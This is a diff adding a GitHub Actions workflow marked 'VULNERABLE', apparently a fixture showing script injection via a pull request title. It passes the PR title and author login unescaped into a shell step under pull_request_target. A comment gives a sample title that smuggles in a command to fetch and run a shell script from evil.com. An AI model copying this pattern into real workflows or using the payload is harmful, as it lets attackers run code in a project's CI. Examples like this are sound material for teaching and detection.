@@ -1,0 +1,17 @@
+# VULNERABLE: Script injection via PR title
+name: Vulnerable Injection
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  greet:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Greet PR author
+        run: |
+          echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
+          echo "Author: ${{ github.event.pull_request.user.login }}"
+          # VULNERABLE: PR title can contain shell metacharacters like:
+          # "; curl evil.com/shell.sh | bash; #
